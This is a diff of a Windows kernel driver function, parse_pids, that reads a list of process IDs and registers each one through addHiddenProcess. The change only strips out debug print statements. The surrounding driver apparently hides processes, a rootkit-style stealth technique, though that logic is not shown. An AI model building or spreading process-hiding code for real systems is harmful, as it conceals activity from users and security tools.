@@ -146,14 +146,11 @@ NTSTATUS parse_pids(PCHAR pids)
 	ULONG len, pid;
 	BOOLEAN first_pid=TRUE;
 	NTSTATUS status;
-
-	DbgPrint("debut parse_pids, pids : %s\n", pids);
 	
 	RtlStringCbLengthA(pids, MAXSIZE, &len);
 	data = ExAllocatePoolWithTag(NonPagedPool, len+1, TEMP_TAG);
 	if(data == NULL)
 		return -1;
-	DbgPrint("avant RtlStringCbPrintfA\n");
 	if(!NT_SUCCESS(RtlStringCbPrintfA(data, len+1, "%s", pids)))
 	{
 		ExFreePool(data);
@@ -163,13 +160,11 @@ NTSTATUS parse_pids(PCHAR pids)
 	start = data;
 	current = data;
 	
-	DbgPrint("avant *current != 0x00\n");
 	while(*current != 0x00)
 	{
 		if(*current == '_' && current!=start)
 		{
 			*current = 0x00;
-			DbgPrint("start : %s\n", start);
 			status = RtlCharToInteger(start, 10, &pid);
 			if(NT_SUCCESS(status) && pid!=0)
 			{
@@ -188,9 +183,7 @@ NTSTATUS parse_pids(PCHAR pids)
 	
 	if(start != current)
 	{
-		DbgPrint("start : %s\n", start);
 		status = RtlCharToInteger(start, 10, &pid);
-		DbgPrint("pid : %d\n", pid);
 		if(NT_SUCCESS(status) && pid!=0)
 		{
 			if(first_pid)
@@ -198,9 +191,7 @@ NTSTATUS parse_pids(PCHAR pids)
 			else
 				addHiddenProcess(pid);
 		}	
-	}
-	
-	DbgPrint("apres le while\n");
+	}	
 	ExFreePool(data);
 	
 	return STATUS_SUCCESS;
